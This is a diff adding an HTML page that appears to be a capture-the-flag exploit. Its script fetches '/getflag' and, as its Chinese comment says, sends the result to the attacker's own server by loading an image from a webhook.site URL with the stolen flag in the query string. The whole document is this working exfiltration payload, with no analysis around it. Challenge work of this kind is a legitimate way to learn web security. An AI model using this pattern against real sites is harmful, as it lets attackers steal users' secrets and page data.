@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch('/getflag')
+        .then(r => r.text())
+        .then(data => {
+          // 把 flag 當作參數傳到你自己伺服器
+          const i = new Image();
+          i.src = 'https://webhook.site/8383a61e-a074-48ac-8286-61f9e2314fec?flag=' + encodeURIComponent(data);
+        });
+    </script>
+  </body>
+</html>
